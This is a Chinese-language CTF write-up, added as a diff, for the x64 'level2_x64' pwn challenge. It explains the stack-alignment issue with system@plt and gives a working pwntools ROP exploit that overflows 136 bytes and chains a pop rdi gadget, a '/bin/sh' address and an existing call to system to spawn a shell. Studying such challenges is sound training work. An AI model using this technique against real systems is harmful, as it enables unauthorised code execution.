@@ -1,0 +1,41 @@
+# level2_x64
+
+检查程序保护
+
+![image-20240513173337280](../图片/image-20240513173337280.png)
+
+反汇编
+
+![image-20240513173401829](../图片/image-20240513173401829.png)
+
+
+
+该题是x64，同样是遇到了写level0题目时的问题，栈对齐问题
+
+在该libc库中调用system_plt的时候，栈必须是0xxxx....xxx8,否则就会“not aligned to 16 bytes”
+
+以至于在该版本库中不能直接调用system_plt，需要拼凑一下栈结构，正好这里有call system可以利用
+
+payload如下
+
+```python
+from pwn import *
+import time 
+
+sh = process('./level2_x64')
+#gdb.attach(sh)
+#sleep(15)
+
+binsh = 0x600a90
+pop_rdi_ret = 0x4006b3
+#不可用，栈不平衡
+system_plt = 0x4004C0
+call_system = 0x400603
+sh.recvuntil(b':')
+
+payload  = flat([b'a'*136,p64(pop_rdi_ret),p64(binsh),p64(call_system)])
+
+sh.send(payload)
+sh.interactive()
+```
+
